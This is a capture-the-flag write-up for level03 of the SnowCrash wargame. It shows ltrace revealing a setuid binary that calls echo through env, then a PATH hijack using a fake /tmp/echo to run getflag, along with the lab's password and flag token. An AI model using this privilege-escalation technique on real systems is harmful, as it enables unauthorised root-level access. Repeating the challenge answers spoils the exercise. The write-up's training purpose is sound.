## level03
```
flag02@SnowCrash:~$ su level03
Password: kooda2puivaav1idi4f57q8iq
level03@SnowCrash:~$
```
```
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```
Use `ltrace` program that simply runs the specified command until it exits.
It intercepts and records the dynamic library calls as well as the system calls executed by the program.
another you can use `strings`
```
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                         = 2003
geteuid()                                                                         = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                               = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                               = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                            = 0
+++ exited (status 0) +++
level03@SnowCrash:~$
```
`system("/usr/bin/env echo Exploit me")` shows that echo command is executed without absolute path. This is a common path vulnerability.

So real `echo` can be faked with a script or symlink. For best practice is recommended to execute binaries by absolute path to avoid this type of vulnerability.  
```
level03@SnowCrash:~$ echo /bin/getflag > /tmp/echo && chmod +x /tmp/echo && PATH=/tmp:$PATH
```
```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
